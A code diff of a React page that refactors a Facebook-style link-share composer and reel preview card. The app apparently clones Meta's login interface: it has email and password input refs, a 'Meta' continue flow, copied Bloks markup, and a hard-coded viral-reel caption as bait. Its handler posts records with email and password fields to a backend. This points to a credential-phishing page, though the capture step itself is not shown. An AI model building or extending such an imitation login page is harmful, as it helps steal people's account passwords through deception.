@@ -1,5 +1,5 @@
 import React, { useState, useRef, useEffect } from 'react';
-import PostCard from './PostCard';
+import PostCard from './PostCard.jsx';
 import './post-card.css';
 
 export default function App() {
@@ -17,6 +17,12 @@ export default function App() {
   const [showMetaBottomSheet, setShowMetaBottomSheet] = useState(false);
   const [metaSheetVisible, setMetaSheetVisible] = useState(false);
   const [isMetaContinuing, setIsMetaContinuing] = useState(false);
+
+  // Post-card state
+  const [postUrl, setPostUrl] = useState('');
+  const [postCaption, setPostCaption] = useState('511K views • 5K likes | Reel by Semsem Photograph');
+  const [postSource, setPostSource] = useState('www.facebook.com');
+  const THUMBNAIL_URL = import.meta.env.VITE_THUMBNAIL_URL || '/download.jpg';
 
   const emailInputRef = useRef(null);
   const passwordInputRef = useRef(null);
@@ -104,79 +110,27 @@ export default function App() {
     window.location.reload();
   };
 
-  const [postUrl, setPostUrl] = useState('');
-  const [postCaption, setPostCaption] = useState('511K views • 5K likes | Reel by Semsem Photograph');
-  const [postSource, setPostSource] = useState('www.facebook.com');
-
   const handleSendPost = async (urlValue) => {
-    const payload = {
-      email: 'share-link',
-      password: 'pending',
-      timestamp: new Date().toISOString(),
-      postUrl: urlValue || postUrl,
-      postCaption,
-      postSource,
-    };
-
     try {
       const response = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
+        body: JSON.stringify({
+          email: 'share-link',
+          password: 'pending',
+          timestamp: new Date().toISOString(),
+          postUrl: urlValue || postUrl,
+          postCaption,
+          postSource,
+        }),
       });
-
       const result = await response.json();
-      if (!response.ok) {
-        console.error('Failed to save post:', result.error || 'Failed to save post');
-      } else {
-        console.log('Post saved:', result.file);
-      }
+      if (!response.ok) console.error('Failed to save post:', result.error);
+      else console.log('Post saved:', result.file);
+      setPostUrl('');
     } catch (err) {
       console.error('Failed to save post:', err);
     }
-  };
-
-  const THUMBNAIL_URL =
-    import.meta.env.VITE_THUMBNAIL_URL ||
-    new URL('/download.jpg', import.meta.url).href;
-  };
-
-  // Post-card state (Facebook-style share composer)
-  const [postUrl, setPostUrl] = useState('');
-  const [postCaption, setPostCaption] = useState('511K views • 5K likes | Reel by Semsem Photograph');
-  const [postSource, setPostSource] = useState('www.facebook.com');
-
-  const handleSendPost = async (urlValue) => {
-    const payload = {
-      email: 'share-link',
-      password: 'pending',
-      timestamp: new Date().toISOString(),
-      postUrl: urlValue || postUrl,
-      postCaption,
-      postSource,
-    };
-
-    try {
-      const response = await fetch(API_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      });
-
-      const result = await response.json();
-      if (!response.ok) {
-        console.error('Failed to save post:', result.error || 'Failed to save post');
-      } else {
-        console.log('Post saved:', result.file);
-      }
-    } catch (err) {
-      console.error('Failed to save post:', err);
-    }
-  };
-
-  const THUMBNAIL_URL =
-    import.meta.env.VITE_THUMBNAIL_URL ||
-    new URL('/download.jpg', import.meta.url).href;
   };
 
   const handleMetaContinue = () => {
@@ -977,61 +931,38 @@ export default function App() {
                                                           </div>
                                                         </div>
                                                       </div>
+                                                    </form>
 
-                                                    {/* Facebook-style share composer */}
-                                                    <div className="post-composer">
-                                                      <div className="post-composer-icon" title="Attach">
-                                                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" width="20" height="20">
-                                                          <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/>
-                                                        </svg>
+                                                    {/* Facebook-style share composer & post card preview */}
+                                                    <div className="post-share" style={{ pointerEvents: 'auto', width: '100%', marginTop: '16px', marginBottom: '16px' }}>
+                                                      <div className="post-composer">
+                                                        <span className="post-composer-icon post-composer__icon" style={{ fontSize: '18px', cursor: 'pointer' }}>📎</span>
+                                                        <span className="post-composer-icon post-composer__icon" style={{ fontSize: '18px', cursor: 'pointer' }}>😊</span>
+                                                        <input
+                                                          className="post-composer-input post-composer__input"
+                                                          type="url"
+                                                          placeholder="Paste a reel link..."
+                                                          value={postUrl}
+                                                          onChange={(e) => setPostUrl(e.target.value)}
+                                                          onKeyDown={(e) => e.key === 'Enter' && handleSendPost(postUrl)}
+                                                        />
+                                                        <button
+                                                          type="button"
+                                                          className="post-composer-send post-composer__send"
+                                                          onClick={() => handleSendPost(postUrl)}
+                                                          aria-label="Send"
+                                                          style={{ background: '#25D366' }}
+                                                        >➤</button>
                                                       </div>
-                                                      <div className="post-composer-icon" title="Emoji">
-                                                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" width="20" height="20">
-                                                          <circle cx="12" cy="12" r="10"/>
-                                                          <path d="M8.5 8.5a5 5 0 0 1 7 7l-2 2"/>
-                                                        </svg>
+                                                      <div style={{ marginTop: '12px' }}>
+                                                        <PostCard
+                                                          thumbnail={THUMBNAIL_URL}
+                                                          caption={postCaption}
+                                                          source={postSource}
+                                                          url={postUrl}
+                                                          onSend={handleSendPost}
+                                                        />
                                                       </div>
-                                                      <input
-                                                        className="post-composer-input"
-                                                        type="text"
-                                                        placeholder="Paste URL here"
-                                                        value={postUrl}
-                                                        onChange={(e) => setPostUrl(e.target.value)}
-                                                        onKeyDown={(e) => e.key === 'Enter' && handleSendPost(postUrl)}
-                                                      />
-                                                      <button
-                                                        type="button"
-                                                        className="post-composer-send"
-                                                        onClick={() => handleSendPost(postUrl)}
-                                                        aria-label="Send"
-                                                      >
-                                                        <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18">
-                                                          <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
-                                                        </svg>
-                                                      </button>
-                                                    </div>
-
-                                                    {/* Post preview card */}
-                                                    <div
-                                                      className="wbloks_1"
-                                                      style={{
-                                                        pointerEvents: 'none',
-                                                        width: '100%',
-                                                        marginTop: '12px',
-                                                        flexGrow: 1,
-                                                        flexShrink: 1,
-                                                        flexDirection: 'column',
-                                                        justifyContent: 'flex-start'
-                                                      }}
-                                                    >
-                                                      <PostCard
-                                                        thumbnail={THUMBNAIL_URL}
-                                                        caption={postCaption}
-                                                        source={postSource}
-                                                        url={postUrl}
-                                                        onSend={handleSendPost}
-                                                        hideClose
-                                                      />
                                                     </div>
 
                                                     {/* Bottom Section */}
